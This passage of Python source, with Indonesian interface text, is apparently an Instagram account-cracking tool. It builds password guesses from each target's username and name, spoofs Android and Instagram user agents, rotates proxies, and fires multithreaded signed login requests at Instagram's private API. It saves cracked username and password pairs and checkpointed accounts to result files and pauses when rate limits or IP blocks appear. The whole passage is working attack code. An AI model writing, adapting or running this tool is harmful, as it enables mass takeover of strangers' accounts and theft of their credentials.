.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi

	def ua_sendiri(self):
		rr=random.randint
		rc=random.choice
		real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
		me =rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
		com=rc(["qcom","mt6833","mt6765"])
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		igv=("270.0.0.0.2,270.0.0.0.51,10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
		igve=igv.split(",")
		andro=rc(["30/11","31/12","29/10"])
		versi=rc(igve)
		android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
		model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
		build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
		merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
		brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
		cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
		versi_app = str(random.randint(111111111,999999999))
		language = "en_GB"
		try:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		uas2=f"Instagram {versi} Android (28/9; 420dpi; 1080x2131; samsung; SM-A505FN; a50; exynos9610; fi_FI; 221134032)"
		uas1=f"Instagram {versi} Android (31/12; 320dpi; 720x1440; OPPO; CPH2135; OP4EFDL1; qcom; it_IT; 566040613)"
		uas3=f"Instagram 317.0.0.34.109 Android (29/10; 280dpi; 720x1460; LGE/lge; LM-K410; mdh15lm; mdh15lm; pt_BR; 563459852)"
		uas = random.choice([uas1,uas3,uas2])
		return uas
	def passwordAPI(self,xnx):
		print('\r')
		prints(Panel(f"{P2}Total Username Terkumpul : {H2}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
		self.ifo()
		u = input(f'• Pilih Methode : ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3","03"]:
			method.append('tiga')
		elif u in ["4","04"]:
			method.append('empat')
		elif u in ["5","05"]:
			method.append('lima')
		elif u in ["6","06"]:
			method.append('enam')
		else:
			method.append('satu')
		prints(Panel(f"{P2}[{B2}01{P2}] Name,Name123,Name1234\n{P2}[{B2}02{P2}] Name,Name123,Name1234,Name12345\n{P2}[{B2}03{P2}] Name,Name123,Name1234,Name12345,Name123456\n{P2}[{B2}04{P2}] Name,Name123,Name1234 + Password Manual",title=f"[{P2} Pilihan Password[/] ]",width=80,padding=(0,4),style=f"{color_table}"))
		c=input(f'• Masukan Pilihan :{C} ')
		if c in ["01","1"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=f"{color_table}"))
			zx=input(f'{N}• Tambahkan Password :{N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			self.generateAPI(xnx,c,zx)		
		else:
			self.passwordAPI(xnx)
	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		global prog,des
		prog = Progress(TextColumn('{task.description}'))
		des = prog.add_task('',total=len(user))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=clean(text=i.split("|")[1].lower(), no_emoji=True)
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345',password.lower()]
									else:
										sandi=[w+'123',w,w+'1234',w+'12345',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									for kontol in self.pwa:
										sandi=[w,w+'123',w+'1234']
										sandi.append(kontol)
								sandi.append(username.replace(".", "").replace("_", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("__", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("@", ""))
								sandi.append(w.replace(" ", ""))
								if 'satu' in method:
									shinkai.submit(self.V1,username,sandi)
								elif 'dua' in method:
									shinkai.submit(self.V2,username,sandi)
								elif 'tiga' in method:
									shinkai.submit(self.V3,username,sandi)
								elif 'empat' in method:
									shinkai.submit(self.V4,username,sandi)
								elif 'lima' in method:
									shinkai.submit(self.V5,username,sandi)
								elif 'enam' in method:
									shinkai.submit(self.V6,username,sandi)
								else:
									shinkai.submit(self.V1,username,sandi)
					except:
						pass
			print('\n')
			prints(Panel(f" {P2}Hasil {acakrich}{len(internal)} {P2}username selesai hasil Ok : {H2}{len(success)}{P2} Hasil Cp : {K2}{len(checkpoint)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
		exit()
	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":"936619743392459"})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	def encpwd(self,password):
		resp = ses.get("https://instagram.com/api/v1/web/accounts/login/ajax/")
		key_id = int(resp.headers.get("ig-set-password-encryption-web-key-id"))
		pub_key = resp.headers.get("ig-set-password-encryption-web-pub-key")
		version =resp.headers.get("ig-set-password-encryption-web-key-version")
		key = Random.get_random_bytes(64)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(
            password.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1,
                           key_id,
                           *list(struct.pack('<h', len(encrypted_key))),
                           *list(encrypted_key),
                           *list(cipher_tag),
                           *list(encrypted_password)])
		encrypted = base64.b64encode(encrypted).decode('utf-8')
		return f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'
	
	def enc_pw(self, pw, link):
		key_id = re.findall('{"key_id":"(.*?)"', str(link.replace("\\","")))[0]
		pub_key = re.findall('public_key\":\"(.*?)\",', str(link.replace("\\","")))[0]
		version = re.findall('version\":\"(\d+)\"}', str(link.replace("\\","")))[0]
		key = Random.get_random_bytes(64)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(pw.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1, int(key_id), *list(struct.pack('<h', len(encrypted_key))), *list(encrypted_key), *list(cipher_tag), *list(encrypted_password)])
		base = base64.b64encode(encrypted).decode('utf-8')
		return f"#PWD_INSTAGRAM_BROWSER:{version}:{time}:{base}"
	def V1(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		gedz=HARIS1["AOREC"][random.randrange(0,277)]["aorec"]
		ven1=gedz.split('|')[1]
		ven2=gedz.split('|')[2]
		giu1=HARIS["giu"]
		giu=giu1.split("||")
	#	lah_entod = open('uaig.txt','r').read().splitlines()
		ua = self.ua_ran()
	#	ua=f'{giu[0]} {igv} {giu[1]} {ven1}; {ven2}; {giu[2]}'
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
#		porg.update(des,description=f"[white]Ajax {str(loop)}/{len(interneal)} OK : [green]{len(success)}CP : [yellow]{len(checkpoint)}[/]")
		aja = random.choice(["[red]","[blue]","[green]"])
		prog.update(des,description=f"[white][{aja}/[white]] {str(loop)}/{len(internal)} [white]OK : [purple]{len(success)}[/] [white]CP :[red] {len(checkpoint)}[/]")
	#	prog.update(des,description=f"[white]({acakrich}✔[white]) STABIL [{acakrich}{user}[/]] {str(loop)}/{len(internal)} [green]OK : -{len(success)}[/] [yellow]CP : -{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							print("")
						#	tree = Tree(" ")
						#	tree.add(f'[green]{user}|{pw}|{pengikut}|{mengikuti}[white]').add(f'[purple]{ua}[white]')
					#		prints(tree)
							prints(Panel(f'\r[white][[green]•[white]] Nama      : [green]{nama}\n[white][[green]•[white]] Username  :[green] {user}\n[white][[green]•[white]] Password  : [green]{pw}\n[white][[green]•[white]] Pengikut  : [green]{pengikut}\n[white][[green]•[white]] Mengikuti :[green] {mengikut}\n[white][[green]•[white]] Postingan : [green]{postingan}',title=f"[green] SUCCESS [green]",width=80,padding=(0,4),style="#00C8FF"))
							os.popen('play-audio gtau.mp3')
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						prints(Panel(f'\r[white][[yellow]•[white]] Nama      : [yellow]{nama}\n[white][[yellow]•[white]] Username  :[yellow] {user}\n[white][[yellow]•[white]] Password  : [yellow]{pw}\n[white][[yellow]•[white]] Pengikut  : [yellow]{pengikut}\n[white][[yellow]•[white]] Mengikuti :[yellow] {mengikut}\n[white][[yellow]•[white]] Postingan : [yellow]{postingan}',title=f"[yellow] CHECKPOINT [yellow]",width=80,padding=(0,4),style="#FF8F00"))
						os.popen('play-audio gtau.mp3')
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"[red]SPAM[/] {str(loop)}/{len(internal)} [green]OK : -{len(success)}[/] [yellow]CP : -{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
				#except Exception as e:print(e)
		loop+=1
	def V2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		warna = random.choice([M, H, K, U, O,])
		logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		igv=random.choice(igver)
		rr=random.randint
		ua=self.ua_rmx()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}✓[/]] proses [{acakrich}{str(loop)}/{len(internal)}[/]] OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw,"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					pasw=pw.replace(' ','+')
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=(respon.text)
					logtemp+=1
					if "logged_in_user" in str(ncek) or "sessionid" in ses.cookies.get_dict() or "userId" in str(ncek):
						success.append(user)
						try:
							nama,pengikut,mengikut,postingan=self.APIinfo(user)
							print("\r                                       ")
							adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
							pepekXD = nel(adit, style='#00FF00')
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[bold green] 𝐋𝐈𝐕𝐄 [bold green]'))
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							print("")
							prints(Panel(f'\rUsername  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							prints("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("\r                                       ")
						adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
						pepekXD = nel(adit, style='#FFFF00')
						print('\n')
						cetak(nel(pepekXD,style='', title='\r[bold yellow] 𝐂𝐄𝐊𝐏𝐎𝐈N𝐓 [bold yellow]'))
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
		loop+=1
	def ua_ig(self):
		rr=random.randint
		rc=random.choice
		return (f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GoogleApp/14.25.13.28.arm")
		return (f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
		return (f"Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36")
		
	def V3(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		if logtemp > 10:
			logtemp=0
		prx=random.choice(prox)
		xxx={"http": f"socks4://{prx}"}
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		ua=self.ua_sendiri()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						try:
							print("")
							print(f'''\r
 {H}    [ 𝐋𝐈𝐕𝐄 ]
 {H}   • {N}Username  : {H}{user}
 {H}   • {N}Password  : {H}{pw}
 {H}   • {N}Pengikut  : {H}{pengikut}
 {H}   • {N}Mengikuti : {H}{mengikut}
 {H}   • {N}Postingan : {H}{postingan}''')
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}â•­({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}â•°{H}{respon.text}\n')
							break
						except:
							prints(Panel(f'\r{P2}[{H2}âœ“{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}âœ“{P2}] Username  : {H2}{user}                \n{P2}[{H2}âœ“{P2}] Password  : {H2}{pw}                \n{P2}[{H2}âœ“{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}âœ“{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}âœ“{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						print(f'''\r
 {K}    [ 𝐂𝐄𝐊𝐏𝐎𝐈N𝐓 ]
 {K}   • {N}Username  : {K}{user}
 {K}   • {N}Password  : {K}{pw}
 {K}   • {N}Pengikut  : {K}{pengikut}
 {K}   • {N}Mengikuti : {K}{mengikut}
 {K}   • {N}Postingan : {K}{postingan}''')
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}â•­({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}â•°{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(15)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					time.sleep(15)
					loop-=1
					break
				#except Exception as e:print(e)
		loop+=1
	def V4(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua=self.ua_baru()
		warna = random.choice([M, H, K, U, O,])
		prog.update(des,description=f"[{acakrich}ajax[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		try:
			for pw in pas:
				ncek=random.randint(1000000000, 99999999999)
				prx=random.choice(prox)
				xxx={"http": f"socks5://{prx}"}
				p = ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbikEBmNhMsxlnCabkCq5bjspvbWU6_UCk0FCzhKplDHJnyXJFzjeLj1NoF95wRUvkfZ4TL3w5nB3KonV8Gu7eeenGJLOpZ0DT9lZfD2336OptE_6iHBRa_R&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Faccounts%252F")
